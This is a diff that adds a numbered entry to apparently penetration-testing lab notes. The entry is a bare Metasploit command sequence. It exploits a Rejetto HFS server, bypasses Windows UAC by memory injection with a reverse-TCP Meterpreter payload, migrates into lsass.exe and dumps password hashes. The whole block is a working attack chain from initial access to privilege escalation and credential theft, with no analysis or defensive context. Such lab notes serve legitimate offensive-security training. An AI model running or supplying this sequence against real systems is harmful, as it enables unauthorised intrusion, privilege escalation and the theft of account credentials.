@@ -1262,6 +1262,39 @@ set SESSION 1
 run
 ```
 
+67)  UAC Bypass: Memory Injection (Metasploit)
+
+```
+cat /root/Desktop/target
+nmap 10.0.23.239
+nmap -sV -p 80 10.0.23.239
+searchsploit hfs
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.0.23.239
+exploit
+getuid
+sysinfo
+ps -S explorer.exe
+migrate 2440
+getsystem
+shell
+net localgroup administrators
+CTRL + C
+background
+use exploit/windows/local/bypassuac_injection
+set session 1
+set TARGET 1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+getsystem
+getuid
+ps -S lsass.exe
+migrate 688
+hashdump
+```
+    
+
 
 
 
